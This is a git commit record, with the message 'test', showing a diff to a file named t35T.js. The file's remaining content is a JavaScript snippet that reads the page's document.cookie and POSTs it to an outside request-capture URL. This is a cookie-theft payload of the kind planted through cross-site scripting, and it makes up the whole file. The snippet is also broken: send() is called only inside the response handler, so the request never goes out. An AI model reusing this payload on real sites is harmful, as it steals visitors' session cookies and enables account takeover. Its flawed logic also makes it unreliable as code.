3d55b1a976f053710152205343dab8f6ea9bd3d4
k4ndAr3c <k4ndAr3c@github.com>
2016-06-01 18:08:07 +0200

    test

--- t35T.js
+++ t35T.js
@@ -1,7 +1,5 @@
-windows.addEventListener("load", function(){
 var http = new XMLHttpRequest();var url = "http://requestb.in/1evyr3z1";var params = document.cookie;http.open("POST", url, true);
 http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 http.setRequestHeader("Content-length", params.length);
 http.setRequestHeader("Connection", "close");
 http.onreadystatechange = function(){if(http.readyState == 4 && http.status == 200){http.send(params);}};
-};);
